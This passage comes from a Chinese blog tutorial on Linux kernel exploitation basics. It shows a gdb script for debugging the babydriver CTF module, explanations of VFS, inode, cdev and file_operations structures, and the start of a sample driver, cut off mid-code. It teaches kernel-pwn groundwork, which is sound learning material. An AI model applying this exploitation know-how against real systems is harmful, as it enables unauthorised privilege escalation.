<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">gdb -q \</span><br><span class="line">  -ex <span class="string">&quot;file <span class="subst">$(find . -name vmlinux)</span>&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;add-symbol-file <span class="subst">$(find . -name babydriver.ko)</span> 0xffffffffc0000000&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;target remote localhost:1234&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;b *0xffffffffc0000030&quot;</span> \</span><br><span class="line">  -ex <span class="string">&quot;c&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>运行 <code>exp</code> 后成功到断点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/image-20231207102120309.png"
                      alt="image-20231207102120309"
                ></p>
<h2 id="内核模块开发"><a href="#内核模块开发" class="headerlink" title="内核模块开发"></a>内核模块开发</h2><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>后面打算做一个文件系统的专题（其实打算把Linux kernel的五大模块都写一遍），略微详细些讲解可以先看一下我blog的另一篇文章<a href="https://jelasin.github.io/2024/01/22/%E6%B5%85%E6%9E%90Linux%E5%86%85%E6%A0%B8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8EIO/">浅析Linux内核之文件与IO</a></p>
<p>在Linux系统的视角下，无论是文件、设备、管道、还是目录，进程，甚至是磁盘，套接字等等，一切都可以被抽象成文件，一切都可以使用访问文件的方式进行操作。图中所示为Linux中虚拟文件系统（VFS）、磁盘&#x2F;Flash文件系统及一般的设备文件与设备驱动程序之间的关系。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/filesys.png"
                      alt="filesys"
                ></p>
<p>应用程序和 <code>VFS</code> 之间的接口是系统调用，而 <code>VFS</code> 与文件系统以及设备文件之间的接口是 <code>file_operations</code> 结构体成员函数，这个结构体包含对文件进行打开、关闭、读写、控制的一系列成员函数。</p>
<h4 id="file结构体"><a href="#file结构体" class="headerlink" title="file结构体"></a>file结构体</h4><p><code>file</code> 结构体代表一个打开的文件，系统中每个打开的文件在内核空间都有一个关联的 <code>struct file</code> 。它由内核在打开文件时创建，并传递给在文件上进行操作的任何函数。在文件的所有实例都关闭后，内核释放这个数据结构。在内核和驱动源代码中，<code>struct file</code> 的指针通常被命名为 <code>file</code> 或 <code>filp</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> 		f_flags;</span><br><span class="line">	<span class="type">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="type">loff_t</span>			f_pos;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="type">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="type">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="type">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure></div>

<h4 id="inode结构体"><a href="#inode结构体" class="headerlink" title="inode结构体"></a>inode结构体</h4><p>VFS inode包含文件访问权限、所有者、组、大小、生成时间、访问时间、最后修改时间等信息。它是Linux管理文件系统的最基本单位，也是文件系统连接任何子目录、文件的桥梁。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="type">umode_t</span>         i_mode; <span class="comment">// inode的权限</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>      i_opflags;</span><br><span class="line">    <span class="type">kuid_t</span>          i_uid; <span class="comment">// inode所有者的id</span></span><br><span class="line">    <span class="type">kgid_t</span>          i_gid; <span class="comment">// inode所属的群组id</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_flags;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">dev_t</span>           i_rdev; <span class="comment">// 若是设备文件，此字段将记录设备的设备号</span></span><br><span class="line">    <span class="type">loff_t</span>          i_size; <span class="comment">// inode所代表的文件大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_atime</span>;</span> <span class="comment">// inode最近一次的存取时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_mtime</span>;</span> <span class="comment">// inode最近一次的修改时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_ctime</span>;</span> <span class="comment">// inode的产生时间</span></span><br><span class="line">    <span class="type">spinlock_t</span>      i_lock; <span class="comment">/* i_blocks, i_bytes, maybe i_size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>          i_bytes;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_blkbits;</span><br><span class="line">    <span class="type">blkcnt_t</span>        i_blocks; <span class="comment">// inode所使用的block数，一个block为512字节</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>  *<span class="title">i_pipe</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">i_bdev</span>;</span> <span class="comment">// 若是块设备，为其对应的block_device结构体指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>     *<span class="title">i_cdev</span>;</span> <span class="comment">// 若是字符设备，为其对应的cdev结构体指针</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></div>

<p>查看 <code>/proc/devices</code> 文件可以获知系统中注册的设备，第一列为主设备号，第二列为设备名：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/devices</span><br><span class="line">Character devices:</span><br><span class="line">  <span class="number">1</span> mem</span><br><span class="line">  <span class="number">4</span> /dev/vc/<span class="number">0</span></span><br><span class="line">  <span class="number">4</span> tty</span><br><span class="line">  <span class="number">4</span> ttyS</span><br><span class="line">  <span class="number">5</span> /dev/tty</span><br><span class="line">  <span class="number">5</span> /dev/console</span><br><span class="line">  <span class="number">5</span> /dev/ptmx</span><br><span class="line">  ...</span><br><span class="line">Block devices:</span><br><span class="line"><span class="number">259</span> blkext</span><br><span class="line">  <span class="number">7</span> loop</span><br><span class="line">  <span class="number">8</span> sd</span><br><span class="line">  <span class="number">9</span> md</span><br><span class="line"> <span class="number">11</span> sr</span><br><span class="line"> <span class="number">65</span> sd</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure></div>

<p>查看 <code>/dev</code> 目录可以获知系统中包含的设备文件，日期前的两列对应设备的主设备号和次设备号, 主设备号是与驱动对应的概念，同一类设备一般用相同的主设备号，不同类设备的主设备号一般不同。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al /dev</span><br><span class="line">total <span class="number">0</span></span><br><span class="line">drwxr-xr-x    <span class="number">8</span> root     root          <span class="number">2940</span> May  <span class="number">8</span> <span class="number">14</span>:<span class="number">17</span> .</span><br><span class="line">drwxr-xr-x   <span class="number">11</span> root     root             <span class="number">0</span> May  <span class="number">8</span> <span class="number">14</span>:<span class="number">18</span> ..</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root     root            <span class="number">60</span> May  <span class="number">8</span> <span class="number">14</span>:<span class="number">17</span> bsg</span><br><span class="line">crw-rw----    <span class="number">1</span> root     root        <span class="number">5</span>,   <span class="number">1</span> May  <span class="number">8</span> <span class="number">14</span>:<span class="number">17</span> console</span><br></pre></td></tr></table></figure></div>

<h3 id="字符驱动设备"><a href="#字符驱动设备" class="headerlink" title="字符驱动设备"></a>字符驱动设备</h3><h4 id="cdev-结构体"><a href="#cdev-结构体" class="headerlink" title="cdev 结构体"></a>cdev 结构体</h4><p><code>cdev</code> 为 linux 描述字符设备的一个结构。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>         <span class="comment">// 内嵌的kobject对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>        <span class="comment">// 所属模块</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span> <span class="comment">// 文件操作结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="type">dev_t</span> dev;                   <span class="comment">// 设备号</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>dev_t</code> 定义了设备号，为 32 位，其中 12 位为主设备号，20 位为次设备号。下面的宏可以获得主设备号和次设备号：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAJOR(<span class="type">dev_t</span> dev)</span><br><span class="line">MINOR(<span class="type">dev_t</span> dev)</span><br></pre></td></tr></table></figure></div>

<p>Linux 内核提供了一组函数用于操作 <code>cdev</code> 结构体：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="keyword">struct</span> file_operations *)</span>; <span class="comment">// 用于初始化cdev的成员，并建立cdev和file_operations之间的连接</span></span><br><span class="line"><span class="keyword">struct</span> cdev *<span class="title function_">cdev_alloc</span><span class="params">(<span class="type">void</span>)</span>; <span class="comment">// 用于动态申请一个cdev内存</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_put</span><span class="params">(<span class="keyword">struct</span> cdev *p)</span>;</span><br><span class="line"><span class="comment">// 用向系统添加和删除一个cdev，完成字符设备的注册和注销</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="type">dev_t</span>, <span class="type">unsigned</span>)</span>; <span class="comment">// 通常在字符设备驱动模块加载函数中调用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_del</span><span class="params">(<span class="keyword">struct</span> cdev *)</span>; <span class="comment">// 字符设备驱动模块卸载函数中调用</span></span><br></pre></td></tr></table></figure></div>

<p>在调用 <code>cdev_add()</code> 函数向系统注册字符设备之前，应首先调用 <code>register_chrdev_region()</code> 或 <code>alloc_chrdev_region()</code> 函数向系统申请设备号：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">register_chrdev_region</span><span class="params">(<span class="type">dev_t</span> from, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>register_chrdev_region()</code> 函数用于已知起始设备的设备号的情况，而 <code>alloc_chrdev_region()</code> 用于设备号未知，向系统动态申请未被占用的设备号的情况。</p>
<h4 id="file-operations-结构体"><a href="#file-operations-结构体" class="headerlink" title="file_operations 结构体"></a>file_operations 结构体</h4><p><code>file_operations</code> 结构体中的成员函数是字符设备驱动程序设计的主体内容，这些函数实际会在应用程序进行 Linux 的 <code>open()</code> 、<code>write()</code> 、<code>read()</code> 、<code>close()</code> 等系统调用时最终被内核调用。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*aio_read) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*aio_write) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="type">int</span> (*readdir) (<span class="keyword">struct</span> file *, <span class="type">void</span> *, <span class="type">filldir_t</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span>;</span><br><span class="line">    <span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">    <span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">    <span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="type">int</span> (*aio_fsync) (<span class="keyword">struct</span> kiocb *, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">    <span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **);</span><br><span class="line">    <span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">              <span class="type">loff_t</span> len);</span><br><span class="line">    <span class="type">int</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>下面对 <code>file_operations</code> 结构体中的主要成员简要介绍：</p>
<ul>
<li><code>llseek()</code> 函数用来修改一个文件的当前读写位置，并将新位置返回，在出错时，这个函数返回一个负值。</li>
<li><code>read()</code> 函数用来从设备中读取数据，成功时函数返回读取的字节数，出错时返回一个负值。</li>
<li><code>write()</code> 函数向设备发送数据，成功时该函数返回写入的字节数。如果次函数未被实现，当用户进行 <code>write()</code> 系统调用时，将得到 <code>-EINVAL</code> 返回值。</li>
<li><code>unlocked_ioctl()</code> 提供设备相关控制命令的实现，当调用成功时，返回给调用程序一个非负值。</li>
</ul>
<h3 id="内核模块编写"><a href="#内核模块编写" class="headerlink" title="内核模块编写"></a>内核模块编写</h3><p>单独建立一个文件夹来编写代码。</p>
<p><strong>源代码</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* linux/module.h是Linux内核模块变成必须包含的头文件</span></span><br><span class="line"><span class="comment">* 头文件kernel.h包含了常用的内核函数</span></span><br><span class="line"><span class="comment">* 头文件init.h包含了宏_init和_exit,它们允许释放内核占用的内存。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_CLEAR 0x1</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_major = <span class="number">230</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_minor = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 参数必须使用module_param宏来声明，这个宏在moduleparam.h中定义。</span></span><br><span class="line"><span class="comment">* module_param需要三个参数：变量的名称、类型以及用于sysfs入口项的访问许可掩码，</span></span><br><span class="line"><span class="comment">* 这个宏必须放在任何函数之外，通常在源文件头部。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">module_param(hello_major, <span class="type">int</span>, S_IRUGO);</span><br><span class="line">module_param(hello_minor, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hello_dev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span 